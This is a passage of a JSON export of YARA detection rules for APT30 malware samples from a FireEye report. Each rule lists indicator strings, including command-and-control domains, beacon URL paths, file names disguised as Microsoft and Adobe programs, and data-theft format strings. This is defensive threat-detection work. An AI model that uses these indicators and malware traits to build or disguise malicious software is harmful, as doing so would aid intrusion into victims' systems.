\"2015-04-03 09:24:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Richic\" fullword ascii\n      $s1 = \"Accept: image/gif, */*\" fullword ascii\n      $s2 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:31","description":"FireEye APT30 Report Sample - file c95cd106c1fecbd500f4b97566d8dc96","minimum_yara":"1.7","name":"APT30_Sample_12_RID2BDC","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"57c8a9ade58f4b474a3d8d12c317b2ae","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_13_RID2BDD : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 95bb314fe8fdbe4df31a6d23b0d378bc\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msofscan.exe\" fullword wide\n      $s1 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n      $s2 = \"Microsoft Office Word Plugin Scan\" fullword wide\n      $s3 = \"? 2006 Microsoft Corporation.  All rights reserved.\" fullword wide\n      $s4 = \"msofscan\" fullword wide\n      $s6 = \"2003 Microsoft Office system\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:41","description":"FireEye APT30 Report Sample - file 95bb314fe8fdbe4df31a6d23b0d378bc","minimum_yara":"1.7","name":"APT30_Sample_13_RID2BDD","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"177691765cc479d1d7855d08fc2aef14","score":60,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_14_RID2BDE : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 6f931c15789d234881be8ae8ccfe33f4\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"AdobeReader.exe\" fullword wide\n      $s4 = \"10.1.7.27\" fullword wide\n      $s5 = \"Copyright 1984-2012 Adobe Systems Incorporated and its licensors. All ri\" wide\n      $s8 = \"Adobe Reader\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:51","description":"FireEye APT30 Report Sample - file 6f931c15789d234881be8ae8ccfe33f4","minimum_yara":"1.7","name":"APT30_Sample_14_RID2BDE","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"7ba755fcc71af84a84b29a0731e455ff","score":60,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_15_RID2BDF : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file e26a2afaaddfb09d9ede505c6f1cc4e3\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Windo\" ascii\n      $s2 = \"HHOSTR\" ascii\n      $s3 = \"Softwa]\\\\Mic\" ascii\n      $s4 = \"Startup'T\" fullword ascii\n      $s17 = \"help32Snapshot0L\" fullword ascii\n      $s18 = \"TimUmoveH\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:01","description":"FireEye APT30 Report Sample - file e26a2afaaddfb09d9ede505c6f1cc4e3","minimum_yara":"1.7","name":"APT30_Sample_15_RID2BDF","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"409c2c6270d7b3f5af3617fd4e84e623","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_16_RID2BE0 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 37e568bed4ae057e548439dc811b4d3a\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Temp1020.txt\" fullword ascii\n      $s1 = \"cmcbqyjs\" fullword ascii\n      $s2 = \"SPVSWh\\\\\" fullword ascii\n      $s4 = \"PSShxw@\" fullword ascii\n      $s5 = \"VWhHw@\" fullword ascii\n      $s7 = \"SVWhHw@\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:11","description":"FireEye APT30 Report Sample - file 37e568bed4ae057e548439dc811b4d3a","minimum_yara":"1.7","name":"APT30_Sample_16_RID2BE0","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"1467c951d41899bac55e7ea7f6dfc819","score":85,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_A_RID2C15 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file af1c1c5d8031c4942630b6a10270d8f4\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"WPVWhhiA\" fullword ascii\n      $s6 = \"VPWVhhiA\" fullword ascii\n      $s11 = \"VPhhiA\" fullword ascii\n      $s12 = \"uUhXiA\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:01","description":"FireEye APT30 Report Sample - file af1c1c5d8031c4942630b6a10270d8f4","minimum_yara":"1.7","name":"APT30_Generic_A_RID2C15","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"a9a85fb6c4a338a71e8a30716145f12f","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_17_RID2BE1 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 23813c5bf6a7af322b40bd2fd94bd42e\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Nkfvtyvn}]ty}ztU\" fullword ascii\n      $s4 = \"IEXPL0RE\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:21","description":"FireEye APT30 Report Sample - file 23813c5bf6a7af322b40bd2fd94bd42e","minimum_yara":"1.7","name":"APT30_Sample_17_RID2BE1","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"349e51ebbcca4928e207d36dd92a554b","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_18_RID2BE2 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file b2138a57f723326eda5a26d2dec56851\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:31\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"w.km-nyc.com\" fullword ascii\n      $s1 = \"tscv.exe\" fullword ascii\n      $s2 = \"Exit/app.htm\" ascii\n      $s3 = \"UBD:\\\\D\" ascii\n      $s4 = \"LastError\" ascii\n      $s5 = \"MicrosoftHaveAck\" ascii\n      $s7 = \"HHOSTR\" ascii\n      $s20 = \"XPL0RE.\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:31","description":"FireEye APT30 Report Sample - file b2138a57f723326eda5a26d2dec56851","minimum_yara":"1.7","name":"APT30_Sample_18_RID2BE2","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"0772747cbbac471913191d5291a42572","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_G_RID2C1B : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 53f1358cbc298da96ec56e9a08851b4b\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\%s=%s\" fullword ascii\n      $s1 = \"Copy File %s OK!\" fullword ascii\n      $s2 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n      $s4 = \"open=%s\" fullword ascii\n      $s5 = \"Maybe a Encrypted Flash Disk\" fullword ascii\n      $s12 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:35:01","description":"FireEye APT30 Report Sample - file 53f1358cbc298da96ec56e9a08851b4b","minimum_yara":"1.7","name":"APT30_Generic_G_RID2C1B","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"e9511d1a54b3a5471fb26c191793007d","score":75,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_19_RID2BE3 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 5d4f2871fd1818527ebd65b0ff930a77\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n      $s1 = \"%s,Volume:%s,Type:%s,TotalSize:%uMB,FreeSize:%uMB\" fullword ascii\n      $s2 = \"\\\\TEMP\\\\\" fullword ascii\n      $s3 = \"\\\\Temporary Internet Files\\\\\" fullword ascii\n      $s5 = \"%s TotalSize:%u Bytes\" fullword ascii\n      $s6 = \"This Disk Maybe a Encrypted Flash Disk!\" fullword ascii\n      $s7 = \"User:%-32s\" fullword ascii\n      $s8 = \"\\\\Desktop\\\\\" fullword ascii\n      $s9 = \"%s.%u_%u\" fullword ascii\n      $s10 = \"Nick:%-32s\" fullword ascii\n      $s11 = \"E-mail:%-32s\" fullword ascii\n      $s13 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n      $s14 = \"Type:%-8s\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 8 of them\n}","date":"2015-04-03 09:25:41","description":"FireEye APT30 Report Sample - file 5d4f2871fd1818527ebd65b0ff930a77","minimum_yara":"1.7","name":"APT30_Sample_19_RID2BE3","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"0762804dab920ccca6a4463457c5824a","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_E_v2_RID2D20 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 71f25831681c19ea17b2f2a84a41bbfb\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 10:18:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Nkfvtyvn}duf_Z}{Ys\" fullword ascii\n      $s1 = \"Nkfvtyvn}*Zrswru1i\" fullword ascii\n      $s2 = \"Nkfvtyvn}duf_Z}{V\" fullword ascii\n      $s3 = \"Nkfvtyvn}*ZrswrumT\\\\b\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 10:18:31","description":"FireEye APT30 Report Sample - file 71f25831681c19ea17b2f2a84a41bbfb","minimum_yara":"1.7","name":"APT30_Generic_E_v2_RID2D20","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"22141fbdcca6b014f9566519cd7c298a","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_20_RID2BDB : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 5ae51243647b7d03a5cb20dccbc0d561\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:21\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"dizhi.gif\" fullword ascii\n      $s2 = \"Mozilla/u\" ascii\n      $s3 = \"XicrosoftHaveAck\" ascii\n      $s4 = \"flyeagles\" ascii\n      $s10 = \"iexplore.\" ascii\n      $s13 = \"WindowsGV\" fullword ascii\n      $s16 = \"CatePipe\" fullword ascii\n      $s17 = \"'QWERTY:/webpage3\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:21","description":"FireEye APT30 Report Sample - file 5ae51243647b7d03a5cb20dccbc0d561","minimum_yara":"1.7","name":"APT30_Sample_20_RID2BDB","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"4e4615a9dbefa88a3cbdd39ec25c1b54","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_21_RID2BDC : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 78c4fcee5b7fdbabf3b9941225d95166\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service.dll\" fullword ascii\n      $s1 = \"(%s:%s %s)\" fullword ascii\n      $s2 = \"%s \\\"%s\\\",%s %s\" fullword ascii\n      $s5 = \"Proxy-%s:%u\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:31","description":"FireEye APT30 Report Sample - file 78c4fcee5b7fdbabf3b9941225d95166","minimum_yara":"1.7","name":"APT30_Sample_21_RID2BDC","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"aaf852089c60a676f2337579066b53d0","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_22_RID2BDD : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file fad06d7b4450c4631302264486611ec3\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(\\\\TEMP\" fullword ascii\n      $s2 = \"Windows\\\\Cur\" fullword ascii\n      $s3 = \"LSSAS.exeJ\" fullword ascii\n      $s4 = \"QC:\\\\WINDOWS\" fullword ascii\n      $s5 = \"System Volume\" fullword ascii\n      $s8 = \"PROGRAM FILE\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:41","description":"FireEye APT30 Report Sample - file fad06d7b4450c4631302264486611ec3","minimum_yara":"1.7","name":"APT30_Sample_22_RID2BDD","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"d32e02724030536f5111eda2c4b2a515","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_F_RID2C1A : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 4c10a1efed25b828e4785d9526507fbc\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:51\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\~zlzl.exe\" fullword ascii\n      $s2 = \"\\\\Internet Exp1orer\" fullword ascii\n      $s3 = \"NodAndKabIsExcellent\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:51","description":"FireEye APT30 Report Sample - file 4c10a1efed25b828e4785d9526507fbc","minimum_yara":"1.7","name":"APT30_Generic_F_RID2C1A","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"a20b2bce01631cdc7f5eead7244ad533","score":95,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_23_RID2BDE : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file a5ca2c5b4d8c0c1bc93570ed13dcab1a\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"hostid\" ascii\n      $s1 = \"\\\\Window\" ascii\n      $s2 = \"%u:%u%s\" fullword ascii\n      $s5 = \"S2tware\\\\Mic\" ascii\n      $s6 = \"la/4.0 (compa\" ascii\n      $s7 = \"NameACKernel\" fullword ascii\n      $s12 = \"ToWideChc[lo\" fullword ascii\n      $s14 = \"help32SnapshotfL\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:51","description":"FireEye APT30 Report Sample - file a5ca2c5b4d8c0c1bc93570ed13dcab1a","minimum_yara":"1.7","name":"APT30_Sample_23_RID2BDE","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"564ecfff275f5e4a48dc5838d24bafc2","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_24_RID2BDF : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 062fe1336459a851bd0ea271bb2afe35\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dizhi.gif\" fullword ascii\n      $s3 = \"Mozilla/4.0\" fullword ascii\n      $s4 = \"lyeagles\" fullword ascii\n      $s6 = \"HHOSTR\" ascii\n      $s7 = \"#MicrosoftHaveAck7\" ascii\n      $s8 = \"iexplore.\" fullword ascii\n      $s17 = \"ModuleH\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:01","description":"FireEye APT30 Report Sample - file 062fe1336459a851bd0ea271bb2afe35","minimum_yara":"1.7","name":"APT30_Sample_24_RID2BDF","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"c58c25f17ab1b86165a4fffa6272cbac","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_25_RID2BE0 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file c4c068200ad8033a0f0cf28507b51842\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\" fullword ascii\n      $s2 = \"aragua\" fullword ascii\n      $s4 = \"\\\\driver32\\\\7$\" fullword ascii\n      $s8 = \"System V\" fullword ascii\n      $s9 = \"Compu~r\" fullword ascii\n      $s10 = \"PROGRAM L\" fullword ascii\n      $s18 = \"GPRTMAX\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:11","description":"FireEye APT30 Report Sample - file c4c068200ad8033a0f0cf28507b51842","minimum_yara":"1.7","name":"APT30_Sample_25_RID2BE0","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"8b2bdcc232d698858b6f08cf30774b83","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_26_RID2BE1 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 428fc53c84e921ac518e54a5d055f54a\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"forcegue\" fullword ascii\n      $s3 = \"Windows\\\\Cur\" fullword ascii\n      $s4 = \"System Id\" fullword ascii\n      $s5 = \"Software\\\\Mic\" fullword ascii\n      $s6 = \"utiBy0ToWideCh&$a\" fullword ascii\n      $s10 = \"ModuleH\" fullword ascii\n      $s15 = \"PeekNamed6G\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:21","description":"FireEye APT30 Report Sample - file 428fc53c84e921ac518e54a5d055f54a","minimum_yara":"1.7","name":"APT30_Sample_26_RID2BE1","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"c3ab3ebe8a2505ec6567411f54b1cbfb","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_D_RID2C18 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 597805832d45d522c4882f21db800ecf\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Windows Security Service Feedback\" fullword wide\n      $s1 = \"wssfmgr.exe\" fullword wide\n      $s2 = \"\\\\rb.htm\" fullword ascii\n      $s3 = \"rb.htm\" fullword ascii\n      $s4 = \"cook5\" ascii\n      $s5 = \"5, 4, 2600, 0\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:31","description":"FireEye APT30 Report Sample - file 597805832d45d522c4882f21db800ecf","minimum_yara":"1.7","name":"APT30_Generic_D_RID2C18","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"c33de9e37ff6277b302bb8194755c682","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_27_RID2BE2 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file d38e02eac7e3b299b46ff2607dd0f288\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:31\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mozilla/4.0\" fullword ascii\n      $s1 = \"dizhi.gif\" fullword ascii\n      $s5 = \"oftHaveAck+\" ascii\n      $s10 = \"HlobalAl\" fullword ascii\n      $s13 = \"$NtRND1$\" fullword ascii\n      $s14 = \"_NStartup\" fullword ascii\n      $s16 = \"GXSYSTEM\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:25:31","description":"FireEye APT30 Report Sample - file d38e02eac7e3b299b46ff2607dd0f288","minimum_yara":"1.7","name":"APT30_Sample_27_RID2BE2","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"f9cadec46c18a434ddfb4f685d6ecf9d","score":95,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_28_RID2BE3 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file e62a63307deead5c9fcca6b9a2d51fb0\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:41\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.flyeagles.com\" fullword ascii\n      $s1 = \"iexplore.exe\" fullword ascii\n      $s2 = \"www.km-nyc.com\" fullword ascii\n      $s3 = \"cmdLine.exe\" fullword ascii\n      $s4 = \"Software\\\\Microsoft\\\\CurrentNetInf\" fullword ascii\n      $s5 = \"/dizhi.gif\" ascii\n      $s6 = \"/connect.gif\" ascii\n      $s7 = \"USBTest.sys\" fullword ascii\n      $s8 = \"/ver.htm\" fullword ascii\n      $s11 = \"\\\\netscv.exe\" fullword ascii\n      $s12 = \"/app.htm\" fullword ascii\n      $s13 = \"\\\\netsvc.exe\" fullword ascii\n      $s14 = \"/exe.htm\" fullword ascii\n      $s18 = \"MicrosoftHaveAck\" fullword ascii\n      $s19 = \"MicrosoftHaveExit\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 7 of them\n}","date":"2015-04-03 09:25:41","description":"FireEye APT30 Report Sample - file 